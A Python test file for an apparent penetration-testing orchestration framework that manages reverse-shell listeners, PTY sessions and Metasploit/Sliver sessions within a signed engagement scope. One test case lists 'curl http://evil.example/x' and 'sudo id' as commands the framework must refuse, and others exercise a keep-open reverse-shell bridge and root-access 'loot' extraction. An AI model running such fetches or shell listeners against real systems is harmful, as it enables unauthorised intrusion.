"""P1: durable ``session_ref``, keep-open reverse shell and pty/raw execution."""

from __future__ import annotations

import asyncio
import json
import os
import select
import shutil
import socket
import subprocess
import sys
import time
from dataclasses import replace
from types import SimpleNamespace
from uuid import uuid4

import pytest

from nexus_core.cli.engage import build_scope
from nexus_core.kernel.control_store import ControlStore
from nexus_core.kernel.fact_verification import derive_assertions
from nexus_core.kernel.models import Identity, RunContext, ToolResult
from nexus_core.kernel.pty_sessions import PtySessionManager
from nexus_core.kernel.sessions import SESSION_PENDING_TARGET, SessionRegistry
from nexus_core.scope import EngagementStore
from nexus_core.tools.handlers import listener as listener_module
from nexus_core.tools.handlers.listener import (
    LISTENER_BRIDGE_SCRIPT,
    listener_handler,
    listener_status_path,
    refresh_listener_session,
)
from nexus_core.tools.handlers.msf_session_kill import msf_session_kill_handler
from nexus_core.tools.handlers.msf_session_list import msf_session_list_handler
from nexus_core.tools.handlers.shell_exec import shell_exec_handler

SECRET = "test-signing-secret-p1"
TARGET = "10.10.10.5"

pytestmark = pytest.mark.skipif(
    shutil.which("tmux") is None, reason="tmux is required for PTY channels"
)


def _free_port() -> int:
    with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as probe:
        probe.bind(("127.0.0.1", 0))
        return int(probe.getsockname()[1])


@pytest.fixture()
def context(tmp_path, monkeypatch):
    monkeypatch.setenv("NEXUS_SCOPE_SIGNING_SECRET", SECRET)
    monkeypatch.setenv("XDG_STATE_HOME", str(tmp_path / "state"))
    workspace = tmp_path / "workspace"
    workspace.mkdir()
    monkeypatch.setenv("NEXUS_WORKSPACE_ROOT", str(workspace))
    monkeypatch.setenv("XDG_DATA_HOME", str(tmp_path / "data"))
    store = ControlStore(tmp_path / "control.db")
    store.initialize()
    scope = EngagementStore(store).create(build_scope("bench", f"{TARGET}/32", SECRET))
    return RunContext(
        "system",
        Identity("operator-1", "system", roles=("operator",)),
        store=store,
        scope=scope,
        project_root=str(workspace),
        run_id=f"run_ref_{uuid4().hex[:8]}",
    )


def test_migration_adds_transport_columns_and_round_trips(tmp_path):
    store = ControlStore(tmp_path / "migration.db")
    store.initialize()
    with store.connect() as conn:
        columns = {row[1] for row in conn.execute("PRAGMA table_info(kernel_sessions)")}
    assert {"transport", "transport_ref", "liveness"} <= columns

    registry = SessionRegistry(store)
    registry.register(
        session_uuid="ref-1", tenant_id="system", engagement_id="eng-1",
        run_id="run-1", session_type="raw", target_host="10.10.10.5",
        opened_by_tool="test", transport="raw", transport_ref="omni-run-1-listener",
        liveness="2026-10-21T10:00:00+00:00",
    )
    row = registry.get("system", "ref-1")
    assert (row["transport"], row["transport_ref"], row["liveness"]) == (
        "raw", "omni-run-1-listener", "2026-10-21T10:00:00+00:00"
    )
    # Legacy registrations are MSF by default, never silently reassignable.
    registry.register(
        session_uuid="ref-legacy", tenant_id="system", engagement_id="eng-1",
        run_id="run-1", session_type="shell", target_host="10.10.10.5",
        opened_by_tool="test",
    )
    assert registry.get("system", "ref-legacy")["transport"] == "msf"
    with pytest.raises(PermissionError):
        registry.register(
            session_uuid="ref-1", tenant_id="system", engagement_id="eng-1",
            run_id="run-1", session_type="raw", target_host="10.10.10.5",
            opened_by_tool="test", transport="pty", transport_ref="omni-other",
        )

    # A pre-P1 row is backfilled from its ``session_type`` on the next start, so
    # re-registering the same UUID remains idempotent instead of conflicting.
    with store.connect() as conn:
        conn.execute(
            """INSERT INTO kernel_sessions
            (id,tenant_id,engagement_id,run_id,session_type,target_host,opened_at,
             opened_by_tool,transport)
            VALUES(?,?,?,?,?,?,?,?,?)""",
            ("legacy-sliver", "system", "eng-1", "run-1", "sliver:session",
             "10.10.10.5", "2026-10-20T00:00:00+00:00", "old", "msf"),
        )
    store.initialize()
    assert registry.get("system", "legacy-sliver")["transport"] == "sliver"


def test_session_list_returns_a_durable_pty_session_ref(context, monkeypatch):
    monkeypatch.delenv("MSF_RPC_PASSWORD", raising=False)
    manager = PtySessionManager(context.project_root, context.run_id)
    transport_ref = manager.session_id("listener-9001-abcd1234")
    SessionRegistry(context.store).register(
        session_uuid="ref-pty-1", tenant_id="system",
        engagement_id=context.scope.engagement_id, run_id=context.run_id,
        session_type="pty", target_host=TARGET, opened_by_tool="listener",
        transport="pty", transport_ref=transport_ref,
    )
    result = asyncio.run(msf_session_list_handler({}, context))
    assert result.success and result.verified
    entry = next(s for s in result.output["sessions"] if s["session_ref"] == "ref-pty-1")
    assert entry["transport"] == "pty"
    assert entry["transport_ref"] == transport_ref
    assert entry["durable"] is True
    assert result.output["durable"] == 1
    assert result.verification_method == "session_list_registry"


def _live_pty_session(context, *, session_ref="ref-live-1"):
    """Start a real tmux pane and register it as a durable pty session."""
    manager = PtySessionManager(context.project_root, context.run_id)
    started = asyncio.run(manager.start("bash", "shell"))
    assert started.alive, started.error
    SessionRegistry(context.store).register(
        session_uuid=session_ref, tenant_id="system",
        engagement_id=context.scope.engagement_id, run_id=context.run_id,
        session_type="pty", target_host=TARGET, opened_by_tool="test",
        transport="pty", transport_ref=started.session_id,
    )
    return manager, started.session_id


def test_shell_exec_pty_runs_a_command_in_the_registered_session(context):
    manager, _ = _live_pty_session(context)
    try:
        result = asyncio.run(shell_exec_handler({
            "transport": "pty", "session_id": "ref-live-1",
            "command": "echo P1-$((6*7))", "timeout_seconds": 10,
        }, context))
        assert result.verified, result.output
        assert result.verification_method == "session_pty_command"
        assert result.output["session_ref"] == "ref-live-1"
        assert "P1-42" in result.output["output"]
        assert result.output["target"] == TARGET
    finally:
        asyncio.run(manager.kill("shell"))


@pytest.mark.parametrize(
    ("command", "method"),
    [
        ("sudo id", "pty_command_denied"),
        ("curl http://evil.example/x", "pty_scope_denied"),
    ],
)
def test_shell_exec_pty_refuses_denied_and_out_of_scope_commands(
    context, command, method
):
    manager, _ = _live_pty_session(context)
    try:
        result = asyncio.run(shell_exec_handler({
            "transport": "pty", "session_id": "ref-live-1",
            "command": command, "timeout_seconds": 5,
        }, context))
        assert result.verified is False
        assert result.verification_method == method
        assert result.outcome in {"denied", "scope_denied"}
    finally:
        asyncio.run(manager.kill("shell"))


def test_shell_exec_rejects_a_transport_that_does_not_match_the_row(context):
    registry = SessionRegistry(context.store)
    manager = PtySessionManager(context.project_root, context.run_id)
    ref = manager.session_id("shell")
    registry.register(
        session_uuid="ref-mismatch", tenant_id="system",
        engagement_id=context.scope.engagement_id, run_id=context.run_id,
        session_type="pty", target_host=TARGET, opened_by_tool="test",
        transport="pty", transport_ref=ref,
    )
    result = asyncio.run(shell_exec_handler({
        "transport": "raw", "session_id": "ref-mismatch",
        "command": "id", "timeout_seconds": 5,
    }, context))
    assert result.verification_method == "session_transport_mismatch"


def test_session_kill_closes_the_row_and_the_tmux_pane(context):
    manager, transport_ref = _live_pty_session(context)
    result = asyncio.run(msf_session_kill_handler({"session_uuid": "ref-live-1"}, context))
    assert result.verified, result.output
    assert result.verification_method == "session_kill_tmux"
    assert SessionRegistry(context.store).get("system", "ref-live-1")["closed_at"]
    assert asyncio.run(manager.exists(transport_ref)) is False


class _FakeManager:
    """Records the bridge command; the pane itself is exercised below."""

    last: "_FakeManager | None" = None

    def __init__(self, root, run_id):
        self.root = root
        self.run_id = run_id
        self.start_calls = []
        _FakeManager.last = self

    def sandbox(self):
        return object()

    def session_id(self, name: str) -> str:
        return f"omni-p1-{name}"[:48]

    async def start(self, cmd: str, name: str):
        self.start_calls.append((cmd, name))
        return SimpleNamespace(alive=True, error=None, session_id=name)


def _write_status(transport_ref: str, **payload) -> None:
    path = listener_status_path(os.environ["NEXUS_WORKSPACE_ROOT"], transport_ref)
    with open(path, "w", encoding="utf-8") as handle:
        json.dump({"updated_at": time.time(), **payload}, handle)


def test_listener_keep_open_registers_a_pending_session_and_binds_its_peer(
    context, monkeypatch
):
    monkeypatch.setattr(listener_module, "PtySessionManager", _FakeManager)
    result = asyncio.run(listener_handler({
        "port": 19001, "mode": "keep_open", "transport": "raw",
    }, context))
    assert result.verified, result.output
    assert result.verification_method == "listener_keep_open"
    session_ref = result.output["session_ref"]
    transport_ref = result.output["transport_ref"]
    registry = SessionRegistry(context.store)
    row = registry.get("system", session_ref)
    assert (row["transport"], row["transport_ref"]) == ("raw", transport_ref)
    assert row["target_host"] == SESSION_PENDING_TARGET
    assert registry.denial(context, session_ref).verification_method == "session_not_connected"
    # The bridge is the only writer outside the kernel: its status file binds the
    # peer through the same signed-scope check as any other session.
    _write_status(transport_ref, status="connected", peer=TARGET)
    status = refresh_listener_session(context, registry, registry.get("system", session_ref))
    assert status["peer"] == TARGET
    assert registry.get("system", session_ref)["target_host"] == TARGET
    assert registry.denial(context, session_ref) is None


def test_listener_keep_open_never_binds_an_out_of_scope_peer(context, monkeypatch):
    monkeypatch.setattr(listener_module, "PtySessionManager", _FakeManager)
    result = asyncio.run(listener_handler({
        "port": 19002, "mode": "keep_open", "transport": "raw",
    }, context))
    registry = SessionRegistry(context.store)
    session_ref = result.output["session_ref"]
    _write_status(result.output["transport_ref"], status="peer_out_of_scope",
                  peer="198.51.100.9")
    status = refresh_listener_session(context, registry, registry.get("system", session_ref))
    assert status["status"] == "peer_out_of_scope"
    assert registry.get("system", session_ref)["target_host"] == SESSION_PENDING_TARGET
    assert registry.denial(context, session_ref).verification_method == "session_not_connected"


def test_shell_exec_raw_refuses_a_listener_without_a_peer(context, monkeypatch):
    monkeypatch.setattr(listener_module, "PtySessionManager", _FakeManager)
    result = asyncio.run(listener_handler({
        "port": 19003, "mode": "keep_open", "transport": "raw",
    }, context))
    refused = asyncio.run(shell_exec_handler({
        "transport": "raw", "session_id": result.output["session_ref"],
        "command": "id", "timeout_seconds": 5,
    }, context))
    assert refused.verification_method == "session_not_connected"


def test_keep_open_bridge_pumps_the_socket_and_the_pane(tmp_path):
    """The real bridge: a peer connects, keys are forwarded, output comes back."""
    port = _free_port()
    status_path = tmp_path / "bridge-status.json"
    process = subprocess.Popen(
        [
            sys.executable, "-c", LISTENER_BRIDGE_SCRIPT,
            "127.0.0.1", str(port), "10", str(status_path),
            json.dumps(["127.0.0.0/8"]), json.dumps([]),
            str(time.time() + 60), json.dumps([]),
        ],
        stdin=subprocess.PIPE, stdout=subprocess.PIPE, stderr=subprocess.PIPE,
    )
    client = None
    try:
        deadline = time.time() + 5
        while True:
            try:
                client = socket.create_connection(("127.0.0.1", port), timeout=0.25)
                break
            except OSError:
                if time.time() >= deadline:
                    raise AssertionError("bridge did not bind in time")
                time.sleep(0.05)
        client.settimeout(5.0)
        assert b"connected from 127.0.0.1" in _read_until(process.stdout, b"connected from")
        process.stdin.write(b"id\n")
        process.stdin.flush()
        assert client.recv(1024) == b"id\n"
        client.sendall(b"OUT:ok\n")
        assert b"OUT:ok" in _read_until(process.stdout, b"OUT:ok")
        status = json.loads(status_path.read_text(encoding="utf-8"))
        assert status["status"] == "connected" and status["peer"] == "127.0.0.1"
        client.close()
        client = None
        assert process.wait(timeout=5) == 0
        assert json.loads(status_path.read_text(encoding="utf-8"))["status"] == "closed"
    finally:
        if client is not None:
            client.close()
        if process.poll() is None:
            process.kill()
            process.wait(timeout=5)


def _read_until(stream, needle: bytes, timeout: float = 5.0) -> bytes:
    deadline = time.time() + timeout
    data = b""
    descriptor = stream.fileno()
    os.set_blocking(descriptor, False)
    while time.time() < deadline:
        ready, _, _ = select.select([descriptor], [], [], 0.1)
        if ready:
            chunk = os.read(descriptor, 4096)
            if not chunk:
                break
            data += chunk
            if needle in data:
                return data
    raise AssertionError(f"bridge produced no {needle!r}: {data!r}")


def test_shell_exec_channel_assertions_promote_access_privilege_and_loot(context):
    derive_context = replace(context, invocation_id="inv-p1-1")
    result = ToolResult(
        output={
            "session_ref": "ref-raw-1",
            "transport": "raw",
            "target": TARGET,
            "output": "uid=0(root) gid=0(root)\nflag{fake_flag}\n",
        },
        verified=True,
        verification_method="session_raw_command",
    )
    rows = derive_assertions(
        "nexus.post.shell_exec", {"transport": "raw"}, result, derive_context
    )
    assert {row["fact_type"] for row in rows} == {"access", "privilege", "loot"}
    assert next(row for row in rows if row["fact_type"] == "access")["key"].startswith(TARGET)
    assert next(row for row in rows if row["fact_type"] == "privilege")["value"]["user"] == "root"


def test_session_kill_closes_a_listener_that_never_got_a_peer(context):
    manager = PtySessionManager(context.project_root, context.run_id)
    started = asyncio.run(manager.start("bash", "pending"))
    assert started.alive
    SessionRegistry(context.store).register(
        session_uuid="ref-pending", tenant_id="system",
        engagement_id=context.scope.engagement_id, run_id=context.run_id,
        session_type="raw", target_host=SESSION_PENDING_TARGET, opened_by_tool="listener",
        transport="raw", transport_ref=started.session_id,
    )
    result = asyncio.run(msf_session_kill_handler({"session_uuid": "ref-pending"}, context))
    assert result.verified, result.output
    assert result.verification_method == "session_kill_tmux"
    assert SessionRegistry(context.store).get("system", "ref-pending")["closed_at"]
    assert asyncio.run(manager.exists(started.session_id)) is False


def test_session_kill_sliver_calls_the_team_server(context, monkeypatch):
    SessionRegistry(context.store).register(
        session_uuid="ref-sliver", tenant_id="system",
        engagement_id=context.scope.engagement_id, run_id=context.run_id,
        session_type="sliver:session", target_host=TARGET, opened_by_tool="sliver_sessions",
        transport="sliver",
    )
    calls = []

    class FakeClient:
        async def connect(self):
            calls.append("connect")

        async def kill_session(self, session_id):
            calls.append(("kill", session_id))

        async def disconnect(self):
            calls.append("disconnect")

    monkeypatch.setattr(
        "nexus_core.tools.handlers.sliver_common.build_client",
        lambda: (FakeClient(), None),
    )
    result = asyncio.run(msf_session_kill_handler({"session_uuid": "ref-sliver"}, context))
    assert result.verified, result.output
    assert result.verification_method == "sliver_session_kill_rpc"
    assert ("kill", "ref-sliver") in calls
    assert SessionRegistry(context.store).get("system", "ref-sliver")["closed_at"]
